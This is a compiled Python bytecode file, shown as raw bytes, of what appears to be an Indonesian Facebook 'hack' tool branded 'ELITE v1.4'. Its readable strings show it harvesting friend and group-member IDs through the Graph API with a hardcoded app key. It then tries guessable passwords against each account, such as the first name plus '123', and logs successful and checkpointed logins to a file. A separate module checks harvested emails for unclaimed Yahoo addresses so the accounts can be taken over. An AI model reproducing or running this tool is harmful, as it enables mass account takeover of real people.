ó
jñ^c           @   s  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z e j e  e j e j j   d d d! g e _ d
   Z d   Z d   Z d   Z d Z d   Z  d Z! g  Z" g  a# g  a$ g  Z% g  Z& d Z' d Z( d   Z) d   Z* d   Z+ d   Z, d   Z- d   Z. d   Z/ d   Z0 d   Z1 d   Z2 d   Z3 d   Z4 d   Z5 e6 d  k re*   n  d S("   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C   s   d GHt  j j   d  S(   Ns   [1;91m[!] [1;97mExit Tool(   t   ost   syst   exit(    (    (    s   /sdcard/DARK.pyt   keluar   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   /sdcard/DARK.pyt   acak   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR	   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   jR   (    (    s   /sdcard/DARK.pyR       s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/DARK.pyt   jalan*   s    s¶  
[1;35mâââââââââ
[1;36mâââââââââ      [1;32mÂ«----------â§----------Â»
[1;33mâ[1;92mâ¼â¼â¼â¼â¼ [1;92m- _ --_--[1;31mââ¦âââââ¬âââ¬ââ   âââââ
[1;36mâ [1;92m [1;92m_-_-- -_ --__[1;93m âââââ¤ââ¬âââ´âââââ â£ â â©â
[1;37mâ[1;92mâ²â²â²â²â²[1;92m--  - _ --[1;96mââ©ââ´ â´â´âââ´ â´   â  âââ [1;96 ELITE v1.4
[1;31mâââââââââ      [1;92mÂ«----------â§----------Â»
[1;32m ââ ââ
[1;37mâââââââââââââââââââââââââââââââââââââââââââââââââââââ
[1;37mâ[1;96m* [1;97mAuthorÂ¹  [1;93m:  [1;31mMR.RMX[1;93m                           [1;37m    â
[1;37mâ[1;96m* [1;97mAuthorÂ² [1;93m :  [1;31m[4mMR.WAI[0m[1;93m [1;37m                              â
[1;37mâ[1;96m* [1;97mWa       [1;93m:  [1;31m+62822xxxxxxx  [1;37m                      â
[1;37mâââââââââââââââââââââââââââââââââââââââââââââââââââââc          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s)   [1;96m[â] [1;92mSedang Masuk [1;97mi   (   R   R   R   R   R   (   t   titikt   o(    (    s   /sdcard/DARK.pyt   tik@   s
      i    s   [31mNot Vulns	   [32mVulnc          C   s{   t  j d  d GHt d  }  t d  } |  d k r^ | d k r^ d GHt j d  t   n d GHt j d  t   d  S(	   Nt   clears)   [1;97mSilahkan login SC nya dulu bosque
s+   [1;96m[*] [1;97mUsername [1;91m: [1;92ms+   [1;96m[*] [1;97mPassword [1;91m: [1;92mt   RMXs!   [1;96m[â] [1;92mLogin successi   s   [1;96m[!] [1;91mSalah!!(   R   t   systemt	   raw_inputR   R   t   logint   LoginSC(   t   usernamet   password(    (    s   /sdcard/DARK.pyt   loginSCO   s    
c          C   sÂ  t  j d  y t d d  }  t   Wnt t f k
 r½t  j d  t GHd d GHd GHt d  } t d  } t   y t	 j d	  Wn  t
 j k
 r¯ d
 GHt   n Xt t	 j _ t	 j d d  | t	 j d <| t	 j d <t	 j   t	 j   } d | k r_y.d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d  d! 6d" d# 6} t j d$  } | j |  | j   } | j i | d% 6 d& } t j | d' | } t j | j  }	 t d d(  }
 |
 j |	 d)  |
 j   d* GHt  j d+  t j d, |	 d)  t   Wq_t j  j! k
 r[d- GHt   q_Xn  d. | k rd/ GHt  j d0  t" j# d1  t   q¾d2 GHt  j d0  t" j# d1  t$   n Xd  S(3   NR%   s	   login.txtt   ri*   s   [1;96m=s4   [1;97m[â] [1;96mLOGIN AKUN FACEBOOK [1;97m[â]s.   [1;96m[+] [1;33mUsername FB [1;91m: [1;92ms.   [1;96m[+] [1;33mPassword FB [1;91m: [1;92ms   https://m.facebook.coms$   
[1;97m[!] [1;91mtidak ada koneksit   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyR,   t   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens%   
[1;96m[â] [1;92mLogin successfuls*   xdg-open https://www.youtube.com/c/SANSBAEsM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=s$   
[1;96m[!] [1;91mtidak ada koneksit
   checkpoints-   
[1;96m[!] [1;91makun anda kena Check points   rm -rf login.txti   s   
[1;96m[!] [1;91mLogin gagal(%   R   R'   t   opent   menut   KeyErrort   IOErrort   logoR(   R$   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closet   postt
   exceptionsR   R   R   R)   (   t   tokett   idt   pwdt   urlRA   t   dataR   t   aR.   R   t   unikers(    (    s   /sdcard/DARK.pyR)   ]   sj    	
S

c          C   sp  t  j d  y t d d  j   }  WnD t k
 rl t  j d  d GHt  j d  t j d  t   n Xy= t j	 d |   } t
 j | j  } | d } | d	 } Wnf t k
 rð t  j d  d
 GHt  j d  t j d  t   n# t j j k
 rd GHt   n Xt  j d  t GHd d GHd | d GHd | d GHd d GHd GHd GHd GHd GHt   d  S(   NR%   s	   login.txtR.   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=t   nameRa   s,   [1;96m[!] [1;91makun anda kena Check points#   [1;96m[!] [1;91mtifak ada koneksii*   s   [1;96m=s7   [1;96m[[1;92mâ[1;96m][1;35m Name [1;91m: [1;32ms   [1;97m               s7   [1;96m[[1;97mâ[1;96m][1;34m ID   [1;91m: [1;32ms   [1;97m              s.   [1;96m[[1;92m1[1;96m][1;37m Hack Facebook s@   [1;96m[[1;92m2[1;96m][1;36m Lihat Daftar Grup               s=   [1;96m[[1;92m3[1;96m][1;33m Yahoo id clone               s2   [1;96m[[1;91m0[1;96m][1;91m LogOut            (   R   R'   RE   t   readRH   R   R   R)   RX   RY   RZ   R[   R\   RG   R_   R   R   RI   t   pilih(   R`   t   otwRe   t   namaRa   (    (    s   /sdcard/DARK.pyRF      sD    

		c          C   s¦   t  d  }  |  d k r' d GHt   n{ |  d k r= t   ne |  d k rS t   nO |  d k ri t   n9 |  d k r t d  t j d	  t   n d GHt   d  S(
   Ns   
[1;97m >>> [1;97mR
   s#   [1;96m[!] [1;91mFill in correctlyR7   t   2t   3R=   s   Remove token successfuls   rm -rf login.txt(	   R(   Ri   t   supert   grupsayat   yahooR!   R   R'   R   (   Rf   (    (    s   /sdcard/DARK.pyRi   »   s     





c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd d GHd	 GHd
 GHd GHd GHd GHt
   d  S(   NR%   s	   login.txtR.   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   i*   s   [1;96m=s6   [1;96m[[1;92m1[1;96m][1;37m Hack Dari Daftar Temans6   [1;96m[[1;92m2[1;96m][1;36m Hack Dari Teman Publics.   [1;96m[[1;92m3[1;96m][1;35m Hack Dari GrupsC   [1;96m[[1;92m4[1;96m][1;93m Hack Dari File (buat wordlist anda)s'   [1;96m[[1;91m0[1;96m][1;91m Kembali(   R   R'   RE   Rh   R`   RH   R   R   R)   RI   t   pilih_super(    (    (    s   /sdcard/DARK.pyRn   Ï   s"    	c          C   s;  t  d  }  |  d k r' d GHt   n.|  d k r¦ t j d  t GHd d GHt d  t j d	 t  } t	 j
 | j  } xÕ| d
 D] } t j | d  q Wn¯|  d k r¡t j d  t GHd d GHt  d  } y> t j d | d t  } t	 j
 | j  } d | d GHWn' t k
 r@d GHt  d  t   n Xt d  t j d | d t  } t	 j
 | j  } xÚ| d
 D] } t j | d  qWn´|  d k rt j d  t GHd d GHt  d  } y> t j d | d t  } t	 j
 | j  }	 d |	 d GHWn' t k
 r;d GHt  d  t   n Xt d  t j d | d t  }
 t	 j
 |
 j  } xß | d
 D] } t j | d  q~Wn¹ |  d k r3t j d  t GHd d GHyC t  d   } x0 t | d!  j   D] } t j | j    qèWWqUt k
 r/d" GHt  d#  t   qUXn" |  d$ k rIt   n d GHt   d% t t t   GHt d&  d' d( d) g } x0 | D]( } d* | Gt j j   t j d+  qWHd, GHd d GHd-   } t d.  } | j | t  d d GHd/ GHd0 t t t   d1 t t t   GHd2 GHt  d3  t   d  S(4   Ns   
[1;97m >>> [1;97mR
   s#   [1;96m[!] [1;91mFill in correctlyR7   R%   i*   s   [1;96m=s/   [1;96m[âº][1;37mScanning ID Teman [1;97m...s3   https://graph.facebook.com/me/friends?access_token=Rd   Ra   Rl   s4   [1;96m[+] [1;37mMasukkan ID Teman [1;91m: [1;32ms   https://graph.facebook.com/s   ?access_token=sG   [1;96m[[1;97mâ[1;96m] [1;36mFriend's name       [1;91m :[1;32m Rg   s$   [1;96m[!] [1;91mFriends not found!s"   
[1;97m[[1;91mEnter Back[1;97m]s8   [1;35m[âº] [1;35mMohon Tunggu Mengambil ID [1;97m...s   /friends?access_token=Rm   s3   [1;96m[+] [1;37mMasukkan ID Grup [1;91m:[1;32m s%   https://graph.facebook.com/group/?id=s   &access_token=s@   [1;96m[[1;97mâ[1;96m] [1;36mNama grup     [1;91m:[1;32m s!   [1;96m[!] [1;91mGroup not founds   
[1;96m[[1;97mKembali[1;96m]s8   [1;96m[âº] [1;93mMohon Tunggu Mengambil ID [1;97m...s5   /members?fields=name,id&limit=999999999&access_token=t   4s6   [1;96m[+] [1;37mMasukkan Nama File  [1;91m: [1;97mR.   s    [1;96m[!] [1;91mFile not founds$   
[1;96m[ [1;97mEnter Back [1;96m]R=   s+   [1;96m[+] [1;36mTotal ID [1;91m: [1;97ms,   [1;32m[âº] [1;32mGasskeun Coeg [1;97m...s   .   s   ..  s   ... s2   [1;96m[[1;97mâ¸[1;96m] [1;93mHacking [1;97mi   s   [1;31m[!] [1;31mStop CTRL+zc         S   s;  |  } y t  j d  Wn t k
 r* n Xyt j d | d t  } t j | j  } d } t	 j
 d | d | d  } t j |  } d | k rÀ d	 | d
 | GHt j | |  nld | d k r'd | d
 | GHt d d  } | j | d | d  | j   t j | |  n| d d } t	 j
 d | d | d  } t j |  } d | k rd	 | d
 | GHt j | |  nd | d k rûd | d
 | GHt d d  } | j | d | d  | j   t j | |  n1| d d }	 t	 j
 d | d |	 d  } t j |  } d | k rhd	 | d
 |	 GHt j | |	  nÄd | d k rÏd | d
 |	 GHt d d  } | j | d |	 d  | j   t j | |	  n]d }
 t	 j
 d | d |
 d  } t j |  } d | k r4d	 | d
 |
 GHt j | |
  nød | d k rd | d
 |
 GHt d d  } | j | d |
 d  | j   t j | |
  nd } t	 j
 d | d | d  } t j |  } d | k r d	 | d
 | GHt j | |  n,d | d k rgd | d
 | GHt d d  } | j | d | d  | j   t j | |  nÅd } t	 j
 d | d | d  } t j |  } d | k rÌd	 | d
 | GHt j | |  n`d | d k r3d | d
 | GHt d d  } | j | d | d  | j   t j | |  nù t j d | d t  } t j | j  } d } t	 j
 d | d | d  } t j |  } d | k rÅd	 | d
 | GHt j | |  ng d | d k r,d | d
 | GHt d d  } | j | d | d  | j   t j | |  n  Wn n Xd  S(   Nt   outs   https://graph.facebook.com/s   /?access_token=t   786786s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RC   s'   [1;96m[[1;92mBerhasil[1;96m][1;97m s    [1;96m|[1;97m s   www.facebook.comt	   error_msgs'   [1;96m[[1;93mCekpoint[1;96m][1;97m s   out/super_cp.txtRe   t   |s   
t
   first_namet   12345t	   last_namet   123t   Bangsatt   Sayangt   Kontolt   Anjing(   R   t   mkdirt   OSErrorRX   RY   R`   RZ   R[   R\   t   urllibt   urlopent   loadt   okst   appendRE   R   R]   t   cekpoint(   t   argt   userRe   R   t   pass1Rd   t   qt   cekt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(    (    s   /sdcard/DARK.pyt   main1  sÀ    






i   s8   [1;96m[[1;97mâ[1;96m] [1;92mSuccessful [1;97m....s5   [1;96m[+] [1;92mTotal OK/[1;93mCP [1;91m: [1;92ms   [1;97m/[1;93msE   [1;96m[+] [1;92mYour CP File Saved [1;91m: [1;97mout/super_cp.txts"   
[1;96m[[1;97mEnter Back[1;96m](    R(   Rq   R   R'   RI   R!   RX   RY   R`   RZ   R[   R\   Ra   R   RG   Rn   RE   t	   readlinest   stripRH   RF   R   R   R   R   R   R   R   R    t   mapR   R   (   t   peakR.   R   t   st   idtt   jokt   opR   t   idgt   aswt   ret   pt   idlistt   lineR"   R#   R   (    (    s   /sdcard/DARK.pyRq   ã   s¨    
	
	

	

	


  		r	)
c          C   s#  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xt  j d  t
 GHd d	 GHyÔ t j d
 |   } t j | j  } xp | d D]d } | d } | d } t d d  } t j |  | j | d  d t |  d t |  GHqÓ Wd d	 GHd t t  GHd GH| j   t d  t   Wn¨ t t f k
 r£d GHt d  t   n| t k
 rÖt  j d  d GHt d  t   nI t j j k
 rød GHt   n' t k
 rd GHt d  t   n Xd  S(   NR%   s	   login.txtR.   s'   [1;96m[!] [1;91mToken tidak ditemukans   rm -rf login.txti   Rs   i*   s   [1;96m=s2   https://graph.facebook.com/me/groups?access_token=Rd   Rg   Ra   s   out/Grupid.txtR   s   
s$   [1;96m[[1;92mGroup[1;96m][1;97m s    [1;96m=>[1;97m s0   [1;96m[+] [1;92mTotal Group [1;91m:[1;97m %ss:   [1;96m[+] [1;92mTersimpan [1;91m: [1;97mout/Grupid.txts   
[1;96m[[1;97mKembali[1;96m]s   [1;96m[!] [1;91mTerhentis'   [1;96m[!] [1;91mGroup tidak ditemukans%   [1;96m[â] [1;91mTidak ada koneksis   [1;96m[!] [1;91mError(   R   R'   RE   Rh   RH   R   R   R)   R   R   RI   RX   RY   RZ   R[   R\   t   listgrupR   R   R   R   R]   R(   RF   t   KeyboardInterruptt   EOFErrorRG   t   removeR_   R   R   (   R`   t   uht   gudR   Rk   Ra   t   f(    (    s   /sdcard/DARK.pyRo   ­  s^    	

!	







c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd d GHd	 GHd
 GHd GHd GHd GHt
   d  S(   NR%   s	   login.txtR.   s   [1;91m[!] Token not founds   rm -rf login.txti   i*   s   [1;96m=s7   [1;96m[[1;92m1[1;96m][1;37m Clone dari daftar temans7   [1;96m[[1;92m2[1;96m][1;36m Clone dari teman publics/   [1;96m[[1;92m3[1;96m][1;35m Clone dari grups/   [1;96m[[1;92m4[1;96m][1;93m Clone dari files'   [1;96m[[1;91m0[1;96m][1;91m Kembali(   R   R'   RE   Rh   R`   RH   R   R   R)   RI   t   clone(    (    (    s   /sdcard/DARK.pyRp   ß  s"    	c          C   s   t  d  }  |  d k r  d GHns |  d k r6 t   n] |  d k rL t   nG |  d k rb t   n1 |  d k rx t   n |  d k r t   n d GHd  S(	   Ns   
[1;97m >>> R
   s#   [1;96m[!] [1;91mFill in correctlyR7   Rl   Rm   Rr   R=   (   R(   t   clone_dari_daftar_temant   clone_dari_temant   clone_dari_member_groupt   clone_dari_fileRF   (   t   embuh(    (    s   /sdcard/DARK.pyR¨   ó  s    




c          C   s×  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d	 } d
 d GHt d  t j d t  } t j | j  } t d d  } t d  d GHd
 d GHx| d D]} | d 7} |  j |  | d } | d } t j d | d t  } t j | j  }	 y|	 d }
 t j d  } | j |
  j   } d | k rwt j d  t t j _ t j d d	  |
 t d <t j   j   } t j d  } y | j |  j   } Wn
 wn Xd | k rw| j d  | d! | d" |
 d#  d$ |
 d% | GHt j |
  qwn  Wqt k
 rqXqWd
 d GHd& GHd' t  t! t   GHd( GH| j"   t# d)  t$   d  S(*   Nt   resets	   login.txtR.   s   [1;91m[!] Token Invalids   rm -rf login.txti   Rs   R%   i    i*   s   [1;96m=s7   [1;96m[[1;97mâº[1;96m] [1;37mTake email [1;97m...s3   https://graph.facebook.com/me/friends?access_token=s   out/MailVuln.txtR   s2   [1;96m[[1;32mâº[1;96m] [1;32mStart [1;97m...s   [1;96m[!] [1;31mStop CTRL+zs   [1;97m=Rd   Ra   Rg   s   https://graph.facebook.com/s   ?access_token=R0   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR/   R+   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   Nama: s   ID :s   Email: s   
s#   [1;37m[[1;92mVuln[1;37m] [1;92ms    [1;96m[[1;97ms7   [1;9m[[1;97mâ[1;96m] [1;92mSuccessful [1;97m....s(   [1;96m[+] [1;92mTotal [1;91m: [1;97ms=   [1;96m[+] [1;92mFile saved [1;91m:[1;97m out/MailVuln.txts"   
[1;96m[[1;97mEnter Back[1;96m](%   R   R'   RE   Rh   R`   RH   R   R   R)   R   R   RI   R!   RX   RY   RZ   R[   R\   R   R   t   compilet   searcht   groupRJ   RM   RN   RO   RP   RR   R   t   berhasilRG   R   R   R]   R(   RF   (   t   mpsht   jmlt   temant   kimakt   saveR   Ra   Rk   t   linksR   t   mailRp   Rj   t   klikR   t   pek(    (    s   /sdcard/DARK.pyR©     sv    	

	




%	

c          C   sS  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d } d	 d
 GHt d  } y> t j d | d t  } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt d  t j d | d t  } t j | j  } t d d  } t d  d GHd d GHx| d D]} | d 7} |  j |  | d }	 | d }
 t j d |	 d t  } t j | j  } y| d } t j d  } | j |  j   } d | k rót j d  t t j _ t j d  d  | t d! <t j   j   } t j d"  } y | j |  j   } Wn
 wn Xd# | k ró| j  d$ |
 d% |	 d& | d'  d( | d) |
 GHt! j |  qón  Wqt k
 rqXqWd	 d
 GHd* GHd+ t" t# t!   GHd, GH| j$   t d-  t   d  S(.   NR%   s	   login.txtR.   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   Rs   i    i*   s   [1;96m=s2   [1;96m[+] [1;37mEnter friend ID [1;91m: [1;32ms   https://graph.facebook.com/s   ?access_token=sB   [1;96m[[1;97mâ[1;96m] [1;93mFB Name        [1;91m :[1;32m Rg   s'   [1;96m[!] [1;91mTeman tidak ditemukans   
[1;96m[[1;97mKembali[1;96m]s)   [1;96m[âº] [1;36mTake email [1;97m...s   /friends?access_token=s   out/TemanMailVuln.txtR   s$   [1;32m[âº] [1;32mStart [1;97m...s   [1;96m[!] [1;91mStop CTRL+zi+   s   [1;97m=Rd   Ra   R0   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR/   R+   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   Nama: s   ID :s   Email: s   
s&   [1;96m[[1;92mVULNâ[1;96m] [1;92ms    [1;96m=>[1;97ms8   [1;96m[[1;97mâ[1;96m] [1;92mSuccessful [1;97m....s(   [1;96m[+] [1;92mTotal [1;91m: [1;97msB   [1;96m[+] [1;92mFile saved [1;91m:[1;97m out/TemanMailVuln.txts"   
[1;96m[[1;97mEnter Back[1;96m](%   R   R'   RE   Rh   R`   RH   R   R   R)   R   R   RI   R(   RX   RY   RZ   R[   R\   RG   RF   R!   R   R   R¯   R°   R±   RJ   RM   RN   RO   RP   RR   R   R²   R   R   R]   (   R³   R´   R   R   R   Rµ   R¶   R·   R   Ra   Rk   R¸   R   R¹   Rp   Rj   Rº   R»   (    (    s   /sdcard/DARK.pyRª   D  s    	


	




%	

c          C   sS  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d } d	 d
 GHt d  } y> t j d | d t  } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt d  t j d | d t  } t j | j  } t d d  } t d  d GHd	 d GHx| d D]} | d 7} |  j |  | d } | d }	 t j d | d t  }
 t j |
 j  } y| d } t j d  } | j |  j   } d | k rót j d   t t j _ t j d! d  | t d" <t j   j   } t j d#  } y | j |  j   } Wn
 wn Xd$ | k ró| j  d% |	 d& | d' | d(  d) | d* |	 GHt! j |  qón  Wqt k
 rqXqWd	 d
 GHd+ GHd, t" t# t!   GHd- GH| j$   t d.  t   d  S(/   NR%   s	   login.txtR.   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   Rs   i    i*   s   [1;96m=s1   [1;96m[+] [1;37mEnter group ID [1;91m:[1;92m s%   https://graph.facebook.com/group/?id=s   &access_token=sA   [1;96m[[1;97mâ[1;96m] [1;96mName group     [1;91m:[1;92m Rg   s!   [1;96m[!] [1;91mGroup not founds"   
[1;96m[[1;97mEnter Back[1;96m]s)   [1;96m[âº] [1;93mTake email [1;97m...s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=s   out/GrupMailVuln.txtR   s$   [1;92m[âº] [1;92mStart [1;97m...s   [1;96m[!] [1;91mStop CTRL+zs   [1;97m=Rd   Ra   s   ?access_token=R0   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR/   R+   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   Nama: s   ID :s   Email: s   
s&   [1;96m[[1;97mVULNâ[1;96m] [1;92ms    [1;96m=>[1;97ms5   [1;96m[[1;97mâ[1;96m] [1;92mSelesai [1;97m....s(   [1;96m[+] [1;92mTotal [1;91m: [1;97msE   [1;96m[+] [1;92mFile tersimpan [1;91m:[1;97m out/GrupMailVuln.txts   
[1;96m[[1;97mKembali[1;96m](%   R   R'   RE   Rh   R`   RH   R   R   R)   R   R   RI   R(   RX   RY   RZ   R[   R\   RG   RF   R!   R   R   R¯   R°   R±   RJ   RM   RN   RO   RP   RR   R   R²   R   R   R]   (   R³   R´   Ra   R.   R   Rµ   R¶   R·   R   Rk   R¸   R   R¹   Rp   Rj   Rº   R   R»   (    (    s   /sdcard/DARK.pyR«     s    	


	




%	

c          C   s¡  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHd d	 GHt d
  }  y t |  d  } | j   } Wn' t k
 rô d GHt d  t   n Xg  } d } t d  d GHt d d  } d d	 GHt |  d  j   } x| D]} | j d d  } | d 7} | j |  t j d  } | j |  j   } d | k rDt j d  t t j _ t j d d  | t d <t j   j   }	 t j d  }
 y |
 j |	  j   } Wn
 qDn Xd | k rV| j | d  d | GHt j |  qVqDqDWd d	 GHd GHd t t t   GHd GH| j    t d  t   d  S(    NR%   s	   login.txtR.   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   Rs   i*   s   [1;96m=s6   [1;96m[+] [1;93mEnter the file name [1;91m: [1;97ms    [1;96m[!] [1;91mFile not founds"   
[1;96m[[1;97mEnter Back[1;96m]i    s$   [1;96m[âº] [1;93mStart [1;97m...s   [1;96m[!] [1;93mStop CTRL+zs   out/FileMailVuln.txtR   s   
R
   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR/   R+   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s&   [1;96m[[1;92mVULNâ[1;96m] [1;92ms5   [1;96m[[1;97mâ[1;96m] [1;92mSelesai [1;97m....s(   [1;96m[+] [1;92mTotal [1;91m: [1;97msE   [1;96m[+] [1;92mFile Tersimpan [1;91m:[1;97m out/FileMailVuln.txts   
[1;96m[[1;97mKembali[1;96m](!   R   R'   RE   Rh   R`   RH   R   R   R)   R   R   RI   R(   R   RF   R!   R   R   R   R¯   R°   R±   RJ   RM   RN   RO   RP   RR   R   R²   R   R   R]   (   t   filest   totalR¹   R³   R´   R·   t   pwRp   Rj   Rº   R   R»   (    (    s   /sdcard/DARK.pyR¬   Ó  st    	

	

		

t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(7   R   R   R   t   datetimeR   RT   R   t	   threadingRZ   R   t	   cookielibRX   RK   t   multiprocessing.poolR    t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRJ   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R!   RI   R$   t   backR²   R   R   Ra   R¡   t   vulnott   vulnR-   R)   RF   Ri   Rn   Rq   Ro   Rp   R¨   R©   Rª   R«   R¬   t   __name__(    (    (    s   /sdcard/DARK.pyt   <module>   sL   
			
				9	%			Ê	2			?	G	H	?